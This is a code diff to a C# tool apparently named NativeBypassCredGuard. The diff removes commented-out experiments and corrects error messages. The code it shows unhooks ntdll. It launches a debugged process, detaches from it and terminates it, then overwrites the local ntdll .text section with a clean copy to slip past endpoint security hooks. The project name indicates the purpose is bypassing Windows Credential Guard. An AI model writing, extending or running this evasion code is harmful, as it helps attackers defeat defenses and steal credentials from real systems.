@@ -24,11 +24,7 @@ namespace NativeBypassCredGuard
 
         [DllImport("ntdll.dll")] public static extern uint NtProtectVirtualMemory(IntPtr ProcessHandle, ref IntPtr BaseAddress, ref uint RegionSize, uint NewProtect, out uint OldProtect);
 
-        // [DllImport("ntdll.dll", SetLastError = true)] public static extern uint NtDebugActiveProcess(IntPtr ProcessHandle, IntPtr DebugObjectHandle);
-
         [DllImport("kernel32.dll")] public static extern bool DebugActiveProcessStop(int dwProcessId);
-
-        [DllImport("ntdll.dll")] public static extern int NtRemoveProcessDebug(IntPtr ProcessHandle, IntPtr DebugObjectHandle);
 
         [DllImport("kernel32.dll", CharSet = CharSet.Unicode, SetLastError = true)] public static extern bool CreateProcess(string lpApplicationName, string lpCommandLine, IntPtr lpProcessAttributes, IntPtr lpThreadAttributes, bool bInheritHandles, uint dwCreationFlags, IntPtr lpEnvironment, string lpCurrentDirectory, ref STARTUPINFO lpStartupInfo, out PROCESS_INFORMATION lpProcessInformation);
 
@@ -134,32 +130,16 @@ namespace NativeBypassCredGuard
             }
 
             // Terminate and close handles in debug process
-            // uint debugstop_res = NtDebugActiveProcess(pi.hProcess, IntPtr.Zero);
-            // Console.WriteLine(pi.hProcess);
-
-            /*
-            // NTSTATUS status = NtQueryInformationProcess(NtCurrentProcess(), ProcessDebugObjectHandle, &hDebug, sizeof(HANDLE), 0);
-            int ProcessDebugObjectHandle = 0x1e;
-            IntPtr hDebug = IntPtr.Zero;
-            Console.WriteLine("hDebug:\t"+ hDebug.ToString("X"));
-            uint ntstatus = NtQueryInformationProcess(pi.hProcess, ProcessDebugObjectHandle, hDebug, (uint)Marshal.SizeOf(typeof(IntPtr)), out uint ReturnLength);
-            Console.WriteLine("ntstatus:\t" + ntstatus);
-            Console.WriteLine("ReturnLength:\t" + ReturnLength.ToString("X"));
-            Console.WriteLine("hDebug:\t" + hDebug.ToString("X"));
-            int debugstop_res = NtRemoveProcessDebug(pi.hProcess, hDebug);
-            */
-
             bool debugstop_res = DebugActiveProcessStop(pi.dwProcessId);
             uint terminateproc_res = NtTerminateProcess(pi.hProcess, 0);
             if (debugstop_res != true)
-            // if (debugstop_res != 0)
             {
-                // Console.WriteLine("[-] Error calling NtDebugActiveProcess. NTSTATUS: " + debugstop_res.ToString("X"));
+                Console.WriteLine("[-] Error calling DebugActiveProcessStop");
                 Environment.Exit(0);
             }
             if (terminateproc_res != 0)
             {
-                Console.WriteLine("[-] Error calling DebugActiveProcessStop or NtTerminateProcess. NTSTATUS:" + terminateproc_res.ToString("X"));
+                Console.WriteLine("[-] Error calling NtTerminateProcess. NTSTATUS:" + terminateproc_res.ToString("X"));
                 Environment.Exit(0);
             }
             uint closehandle_proc = NtClose(pi.hProcess);
@@ -177,29 +157,22 @@ namespace NativeBypassCredGuard
         // Overwrite hooked ntdll .text section with a clean version
         public static void ReplaceNtdllTxtSection(IntPtr unhookedNtdllTxt, IntPtr localNtdllTxt, int localNtdllTxtSize)
         {
-
             // VirtualProtect to PAGE_EXECUTE_WRITECOPY
             uint dwOldProtection;
             IntPtr currentProcess = (IntPtr)(-1);
             uint localNtdllTxtSizeUint = (uint)localNtdllTxtSize;
             uint vp_res = NtProtectVirtualMemory(currentProcess, ref localNtdllTxt, ref localNtdllTxtSizeUint, PAGE_EXECUTE_WRITECOPY, out dwOldProtection);
-            //bool vp1_res = VirtualProtect(localNtdllTxt, (uint)localNtdllTxtSize, PAGE_EXECUTE_WRITECOPY, out dwOldProtection);
-            //if (!vp1_res)
             if (vp_res != 0)
             {
                 Console.WriteLine("[-] Error calling NtProtectVirtualMemory (PAGE_EXECUTE_WRITECOPY)");
                 Environment.Exit(0);
             }
 
-            // Console.ReadKey(); Console.WriteLine("1");
-
             // Copy from one address to the other
             unsafe
             {
                 Buffer.MemoryCopy((void*)unhookedNtdllTxt, (void*)localNtdllTxt, localNtdllTxtSize, localNtdllTxtSize);
             }
-
-            // Console.ReadKey(); Console.WriteLine("2");
 
             // VirtualProtect back to PAGE_EXECUTE_READ
             uint vp_res2 = NtProtectVirtualMemory(currentProcess, ref localNtdllTxt, ref localNtdllTxtSizeUint, dwOldProtection, out dwOldProtection);
@@ -209,6 +182,5 @@ namespace NativeBypassCredGuard
                 Environment.Exit(0);
             }
         }
-
     }
 }
